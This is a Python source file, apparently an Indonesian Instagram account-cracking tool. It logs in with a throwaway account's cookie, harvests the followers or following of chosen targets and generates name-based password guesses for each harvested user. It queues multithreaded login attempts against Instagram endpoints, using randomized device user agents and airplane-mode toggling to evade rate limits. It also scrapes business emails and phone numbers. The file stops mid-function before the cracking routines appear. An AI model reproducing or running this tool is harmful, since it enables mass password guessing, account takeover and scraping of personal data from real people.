import urllib.parse
from urllib.parse import quote
import re, os, sys, json, random, urllib, urllib.request, hmac, hashlib, time, string, uuid, requests, base64,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as bsp
from rich.progress import Progress,TextColumn,SpinnerColumn
from string import *
xx = 0
rr = random.randint;rc = random.choice

Uid, Uuid = [], []
Ok, Cp, Loop = 0, 0, 0
P = "\033[97m"
I = "\033[30m"
A = "\033[90m"
H = "\033[32m"
K = "\033[33m"
M, K2 = K, K

getuserid = 'https://i.instagram.com/api/v1/users/web_profile_info/?username={nama!s}'
HEADERS   = {'Host': 'www.instagram.com','x-ig-app-id': '1217981644879628','x-ig-www-claim': 'hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03DgxmT','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-asbd-id': '129477','x-csrftoken': 'TeWMHnpFe4nja5IPA2bBUjOiVMwndp5E','sec-fetch-site': 'same-origin','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}
ua = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
userinfo  = 'https://i.instagram.com/api/v1/users/{id!s}/info/'

def Clear():
	try:
		os.system('clear')
	except:pass

def find_res(kya= []):
	try:
		if os.path.isfile('Data/OK--50.txt') is True:
			for a in open('Data/OK-50.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
		if os.path.isfile('Data/OK-100.txt') is True:
			for a in open('Data/OK-100.txt','r').read().splitlines():
				xyz = re.findall('ds_user_id=(.*)',str(a))
				if len(xyz) == 0:continue
				if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
	except:pass
	if len(kya) == 0:
		for kyta in kya:
			try:
				print(f'\n{P}Login: {H}{kyta}')
				uid = re.search('ds_user_id=(\d+)', str(kyta)).group(1)
				req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies={'cookie':kyta}).json()['user']['full_name']
				open('Data/IG-login.txt','w').write(f'{kyta}')
				print(f'\n{P}Login sebagai : {req}')
				time.sleep(2)
				return(memek)
			except Exception as e:
				print(f'\n{P}Expired: {K}{kyta}')
				
def Aset_Ig():
	Clear()
	if os.path.isfile('Data/IG-login.txt') is True:
		coki = {'cookie':open('Data/IG-login.txt','r').read()}
	else:
		print(f"{P}[/] Silahkan Masukan Cookies Akun Instagram Pastikan Menggunakan Akun Tumbal!")
		raraky = {'cookie':input("\ncookie: ")}
		if raraky['cookie'] == 'res':
			coki = {'cookie':find_res()}
		else:
			coki = raraky
	try:
		#cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=ua,  cookies=coki).json()
		uid = re.search('ds_user_id=(\d+)', str(coki['cookie'])).group(1)
		req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki).json()['user']
		open('Data/IG-login.txt','w').write(f'{coki["cookie"]}')
	except:
		os.system('rm -rf Data/IG-login.txt')
		print(f"{M}cookies Invalid Gunakan Cookies yang Lain!");time.sleep(3);Aset_Ig()
	return coki, req['full_name'], req['follower_count']

def Menu():
	Clear()
	aset, nama, fol = Aset_Ig()
	print(f"\n{P}[ code by {H}@naufalarky{P} ]\n");print(f"{P}[ username : {nama[:8]}; followers : {fol} ]\n")
	print("[ menu dump Instagram ]\n\n01. Crack dari pengikut\n02. Crack dari followers\n03. Crack dari Komentar\n00. Hapus/Ganti Cookies")
	x = input("\npilih 01/02/03/00 : ")
	if x in ['01','1']:dumps(aset, True)
	elif x in ['02','2']:dumps(aset, False)
	elif x in ['03','3']:print("belum tersedia, akan tersedia saat update berikutnya!!");exit()
	elif x in ['00','0']:os.system("rm Data/IG-login.txt");print("berhasil menghapus cookies");exit()

def dumps(cintil, typess, xyz = []):
	if 'csrftoken' not in str(cintil):
		try:
			memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
			token = memek['config']['csrf_token']
			cintil['cookie'] +=';csrftoken=%s;'%(token)
		except Exception as e:
			os.system('rm -rf Data/IG-login.txt')
			exit(f'\n{P}[{K}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
	print(f"\n{P}Masukkan Username Instagram, Gunakan koma, {K}CTRL + C {P}Untuk berhenti Dump!")
	users = input("username : ").split(',')
	try:
		for y in users:
			req = requests.get(f'https://www.instagram.com/{y}/', cookies = cintil).text
			uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
			if uid not in xyz:xyz.append(uid)
	except:pass
	try:
		mode = 'followers' if typess is True else 'following'
		for kintil in xyz:
			if typess is True:
				Graphql(True, kintil, cintil['cookie'], '')
			else:
				Graphql(False, kintil, cintil['cookie'], '')
	except:pass
	print("");MetodeType()
		
def Graphql(typess, userid, cokie,after):
	global xx
	api = "https://www.instagram.com/graphql/query/"
	csr = 'variables={"id":"%s","first":24,"after":"%s"}'%(userid,after)
	mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if typess is False else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
	try:
		ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
		req = requests.get(api, params=mek, headers=ptk).json()
		if 'require_login' in req:
			if len(Uuid) > 0:
				pass
			else:
				exit(f'\n{P}[{K2}!{P}] Invalid Cookie')
		khm = 'edge_followed_by' if typess is True else 'edge_follow'
		for xyz in req['data']['user'][khm]['edges']:
			username = xyz['node']['username']
			xy = xyz['node']['username'] + '|' + xyz['node']['full_name']
			if xy not in Uuid:
				xx += 1
				Uuid.append(xy)
				print('\rMengumpulkan Uid {}{}{}                            '.format(M, len(Uuid), P), end='')
				time.sleep(0.0009)
		end = req['data']['user'][khm]['page_info']['has_next_page']
		if end is True:
			after = req['data']['user'][khm]['page_info']['end_cursor']
			Graphql(typess, userid, cokie, after)
		else:pass
	except:pass

def MetodeType():
	global SistemLog
	print(f"""\n[ pilih method yang akan di gunakan ]\n\n01. Method www.instagram.com (Instagram web)
02. Method i.instagram.com (Instagram app)
03. Method i.instagram.com (Threads app) {H}Recommended{P}
04. Method b.i.instagram.com (Instagram app)""")
	method = input("\npilih 01/02/03/04 :")
	if method in ['01','1']: SistemLog = "api.instagram.com"
	elif method in ['02','2']: SistemLog = "i.instagram.com"
	elif method in ['03','3']: SistemLog = "www.instagram.com"
	elif method in ['04','4']: SistemLog = "b.i.instagram.com"
	else:SistemLog = "api.instagram.com"
	SetCrack()

def SetCrack():
	print("\ncrack sedang berlangsung, harap hidupkan \nmode pesawat setiap 100 username/id selama 5 detik\n")
	with ThreadPoolExecutor (max_workers=30) as ASF:
		for i in Uuid:
			try:
				username, name = i.split('|')
				kontol = Password(name)
				if SistemLog == "api.instagram.com":
					ASF.submit(Crack_api, username, kontol)
				elif SistemLog == "i.instagram.com":
					ASF.submit(Crack_i, username, kontol)
				elif SistemLog == "www.instagram.com":
					ASF.submit(Crack_w, username, kontol)
				elif SistemLog == "b.i.instagram.com":
					ASF.submit(Crack_N, username, kontol)
			except:pass
	exit(' \n\n Crack Telah Selesai')
	
def Password(name):
        xxzx, ccvc = [], []
        xxzx.append("kamunanya")
        xxzx.append("kamu nanya")
        xxzx.append("katasandi")
        xxzx.append("kata sandi")
        xxzx.append("sayang")
        for nama in name.split(' '):
            nama = nama.lower()
            if len(nama) <3: continue
            elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama.capitalize()+'123');xxzx.append(nama.capitalize()+'1234');xxzx.append(nama.capitalize()+'12345')
            else:xxzx.append(nama);xxzx.append(name);xxzx.append(nama+'123');xxzx.append(nama+'1234');xxzx.append(nama+'12345');xxzx.append(nama.capitalize()+'123');xxzx.append(nama.capitalize()+'1234');xxzx.append(nama.capitalize()+'12345')
        return(xxzx)

def convert_cookie(item):
    try:
        sesid = 'sessionid=' + re.findall('sessionid=(\d+)', str(item))[0]
        ds_id = 'ds_user_id=' + re.findall('ds_user_id=(\d+)', str(item))[0]
        csrft = 'csrftoken=' + re.findall('csrftoken=(.*?);', str(item))[0]
        donez = '%s;%s;%s;ig_nrcb=1;dpr=2'%(ds_id, sesid, csrft)
    except Exception as e:
        donez = 'cookies tidak di temukan, error saat convert'
    return donez

ses = requests.Session()
def data_target(name):
	for y in name.split(','):
		try:
			HEADERS.update({'user-agent'  : 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)','x-ig-app-id' :'1217981644879628'})
			profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers = HEADERS).json()['data']['user']
			post      = profil_info_target["edge_owner_to_timeline_media"]["count"]
			peng  = profil_info_target["edge_followed_by"]["count"]
			meng = profil_info_target["edge_follow"]["count"]
			mail = profil_info_target["business_email"]
			phone = profil_info_target["business_phone_number"]
			fullname = profil_info_target["full_name"]
			fbid = profil_info_target["fbid"]
		except Exception as e:
			post, peng, meng, mail, fullname, fbid, phone = None, None, None, None, None,  None, None
	return post, peng, meng, mail, fullname, fbid, phone

def UserAgent():
	andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
	dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
	pxl=rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051'])
	basa=rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133'])
	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121")
	igve=igv.split(",")
	versi=random.choice(igve)
	ua1 = "Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/xiaomi; Redmi Note 8; ginkgo; qcom; {basa}; {kode})"
	ua2 = "Instagram {versi} (iPhone12,1; iOS 13_3_1; en_AX; en-AX; scale=2.00; {pxl}; {kode})"
	ua3 = "Instagram {versi} Android ({andro}; {dpis}; {pxl}; OPPO; CPH2109; OP4BA5L1; qcom; {basa}; {kode})"
	ua4 = "Instagram (versi} Android ({andro}; {dpis}; {pxl}; Meizu; MX6; MX6; mt6797; {basa}; {kode})"
	uav = rc([ua1, ua2, ua3, ua4])
	return uav

def Android_Version(android_version):
	if str(android_version) == '9':
		return ('28')
	elif str(android_version) == '10':
		return ('29')
	elif str(android_version) == '11':
		return ('30')
	elif str(android_version) == '12':
		return ('31')
	else:
		return ('32')

def UserAgentBarcelona():
	#; #
	dpi_pixel = random.choice(['240dpi; 1760x792', '240dpi; 1920x864', '320dpi; 2400x1080', '400dpi; 3200x1440', '480dpi; 1080x1920', '320dpi; 900x1600', '320dpi; 720x1280', '240dpi; 540x960', '280dpi; 1920x1080', '240dpi; 160x900', '240dpi; 1280x720', '160dpi; 960x540'])
	android_version = random.choice(['10', '11', '9', '12', '13'])
	kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133'])
	igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121")
	igve=igv.split(",")
	versi=random.choice(igve)
	realme = random.choice(["RMX3997","RMX3765","RMX3820","RMX3765","RMX3999","RMX3997","RMX3997","RMX3999","RMX3820","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3765","RMX3910","RMX3997","RMX3765","RMX3998","RMX3765","RMX3765","RMX3910","RMX3765","RMX3765","RMX3765","RMX3765","RMX3765","RMX3999","RMX3999","RMX3910","RMX3765","RMX3999","RMX3765","RMX3997","RMX3910","RMX3765","RMX3999","RMX3999","RMX3997","RMX3765","RMX3998","RMX3997","RMX3765","RMX3820","RMX3998","RMX3765","RMX3999","RMX3998","RMX3998","RMX3765","RMX3765","RMX3765","RMX3999","RMX3910","RMX3161","RMX3997","RMX3997","RMX3765","RMX3765","RMX3765","RMX3998","RMX3765","RMX3999","RMX3765","RMX3997","RMX3765","RMX3997","RMX3820","RMX3765","RMX3997","RMX3999","RMX3765","RMX3997","RMX3765","RMX3999","RMX3999","RMX3997","RMX3820","RMX3997","RMX3997","RMX3999","RMX3997","RMX3765","RMX3910","RMX3820","RMX3997","RMX3765","RMX3999","RMX3999","RMX3999","RMX3765","RMX3997","RMX3998","RMX3820","RMX3999","RMX3910","RMX3765","RMX3997","RMX3765","RMX3999","RMX3997","RMX3765","RMX3997","RMX3820","RMX3999","RMX3997"])
	ara1 = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Realme; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, realme))
	samsung = random.choice(["SM-A115F","Samsung A4","Samsung A4","samsung a1","SM-A145R","samsung a1","SM-G973F","SM-A346B","SM-G973F","SM-S9280","SM-E156B","SM-E146B","samsung a1","SM-A346B","Samsung A4","SM-E546B","SM-A346B","SM-A145R","SM-A336B","GT-S5660","Samsung A4","samsung a1","SM-E156B","SM-A115F","SM-S9160","SM-A336B","Samsung A4","samsung a1","SM-A346B","samsung a1","SM-A115F","SM-A115F","Samsung A4","SM-A145R","SM-A136B","SM-S9280","SM-A115F","SM-S9280","SM-E546B","SM-A336B","SM-A136B","Samsung A4","SM-A115F","SM-A145R","samsung a1","SM-A336B","SM-A136B","SM-A336B","SM-G973F","SM-A336B","GT-S5660","Samsung A4","GT-S5660","Samsung A4","SM-A015M","Samsung A4","SM-A115F","SM-E546B","SM-E156B","SM-A015M","SM-A136B","SM-A336B","SM-E546B","SM-A145R","SM-A136B","SM-A015M","SM-A115F","Samsung A4","GT-S5660","SM-S9160","Samsung A4","SM-E146B","SM-A136B","SM-E546B","SM-G973F","Samsung A4","SM-A336B","SM-G973F","SM-A015M","SM-S9280","SM-A115F","Samsung A4","Samsung A4","SM-A115F","Samsung A4","samsung a1","GT-S5660","SM-A346B"])
	ara2 = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; samsung; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, samsung))
	infinix = random.choice(["23046RP50C","22127RK46C","23054RA19C","MiTV-AESP0","22041216UC","22041216UC","2312CRNCCL","22041216UC","MiTV-AESP0","22041216UC","24040RN64Y","22041216UC","23046PNC9C","2312CRNCCL","23046RP50C","2312CRNCCL","23113RKC6C","22101320C","22041216UC","22041216UC","24040RN64Y","23046RP50C","22101320C","21091116AC","MiTV-AESP0","22101320C","2312CRNCCL","23046RP50C","2312CRNCCL","2312CRNCCL","23046RP50C","23013RK75C","22101320C","22122RK93C","2312CRNCCL","23013RK75C","23113RKC6C","22041216UC","2312CRNCCL","23046PNC9C","24030PN60G","22101320C","22041216UC","2312CRNCCL","23013RK75C","22041216UC","23113RKC6C","22101320C","24040RN64Y","2312CRNCCL","24040RN64Y","23046RP50C","22101320C","2312CRNCCL","23046PNC9C","22041216UC","2312CRNCCL","22122RK93C","22041216UC","23013RK75C","2312CRNCCL","22041216UC","2312CRNCCL","22122RK93C","22101320C","22041216UC","24040RN64Y","MiTV-AESP0","MiTV-AESP0","MiTV-AESP0","22041216UC","22101320C","22101320C","2404ARN45A","23046RP50C","23046PNC9C","21091116AC","21091116AC","22127RK46C","21091116AC","22101320C","23113RKC6C","24030PN60G","22101320C","23046RP50C","23113RKC6C","23046RP50C","22101320C","22127RK46C","23113RKC6C","2312CRNCCL","21091116AC","23046PNC9C","22041216UC","23046RP50C","MiTV-AESP0","24040RN64Y","21091116AC","23113RKC6C","2312CRNCCL","24040RN64Y","24040RN64Y","22122RK93C","23113RKC6C","22101320C","2312CRNCCL","MiTV-AESP0","23113RKC6C","MiTV-AESP0","24040RN64Y","22041216UC"])
	ara5 = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; Xiaomi; {}; marlin; qcom; in_ID)'.format(Android_Version(android_version), android_version, dpi_pixel, infinix))
	motorola = random.choice(['MOT-A6020l37', 'MotoA953', 'XT603', 'XT682', 'MB865', 'MB865', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'MB860', 'Motorola Defy', 'XT320', 'MOT-XT320', 'XT557', 'XT556', 'XT555C', 'Droid', 'Momodesign MD Droid', 'Droid', 'DROID2', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID2 GLOBAL', 'DROID3', 'XT894', 'DROID4', 'DROID4', 'DROID4 4G', 'Droid4X-WIN', 'Droid4X-WIN', 'DROID BIONIC', 'DROID BIONIC', 'DROID BIONIC 4G', 'DroidBox', 'XT1565', 'XT1030', 'XT1030', 'DroidPC Dual Core', 'DROID Pro', 'XT610', 'XT910', 'DROID RAZR', 'MOT-XT910S', 'XT910', 'DROID RAZR', 'XT910', 'MOT-XT910', 'DROID RAZR HD', 'XT910', 'DROID RAZR 4G', 'XT918', 'XT916', 'XT914', 'XT915', 'XT916', 'XT920', 'XT919', 'XT919', 'XT920', 'DROID RAZR HD', 'XT925', 'DROID RAZR HD', 'XT926', 'XT890', 'XT890', 'XT890', 'XT890', 'XT907', 'XT907', 'XT905', 'XT907', 'XT907', 'XT912', 'XT886', 'XT885', 'DROID RJ', 'XT1254', 'XT1254', 'XT1585', 'XT1080', 'XT1080', 'XT1080', 'Droid V3.0', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROIDX', 'DROID X2', 'DROID X2', 'Motorola E7 POWER', 'motorola edge', 'Motorola Edge S', 'motorola edge (2021)', 'motorola edge (2022', 'motorola edge (2022)', 'motorola edge 20', 'XT2153-1', 'motorola edge 20 pro', 'motorola edge 20 pro', 'motorola edge 30', 'motorola edge 30 neo', 'motorola edge 30 pro', 'motorola edge 40', 'motorola edge 40 pro', 'motorola edge plus', 'motorola edge plus', 'XT2125-4', 'xt2125-4', 'XT2175-2', 'XT2175-2', 'XT2201-2', 'XT2201-2', 'XT2201-2', 'XT881', 'XT901'])
	ara6 = ('Barcelona 289.0.0.77.109 Android ({}/{}; {}; motorola; {}; marlin; qcom; in_ID; 489720145)'.format(Android_Version(android_version), android_version, dpi_pixel, motorola))
	user_agent = random.choice([ara1, ara2, ara5, ara6])
